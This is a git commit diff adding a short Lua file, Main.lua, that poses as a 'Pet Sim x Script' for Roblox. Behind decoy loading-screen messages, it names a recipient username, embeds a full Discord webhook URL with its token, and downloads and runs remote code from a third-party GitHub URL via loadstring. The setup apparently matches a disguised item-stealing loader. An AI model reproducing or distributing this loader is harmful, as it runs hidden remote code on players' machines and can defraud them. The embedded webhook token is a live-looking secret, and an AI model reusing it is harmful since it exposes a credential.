b223a9187bff0786c5f05885d6c96dae942dbfc8
Project-WD <124843577+Project-WD@users.noreply.github.com>
2023-04-07 16:11:13 +0800

    Update and rename Script to Main.lua

---
+++ Main.lua
@@ -0,0 +1,9 @@
+Username = "AccountTest21374"
+WebHook = "https://discord.com/api/webhooks/1093807517664030780/JxcEWLGZO0YYRZlXWHq3ihPRTKGXdXWv7FZfY7Vyd03KiTidgUe-bZPfqFE5eM5of0P6"
+loadingscreen = true
+_G.CustomScriptName = "Pet Sim x Script"
+_G.Text1 = "Script Loaded..."
+_G.Text2 = "Waiting for Script..."
+_G.Text3 = "Checking Scripts..."
+_G.Text4 = "Starting Script..."
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Justanotherdme/petsimx22/main/petsimguiss.lua"))()
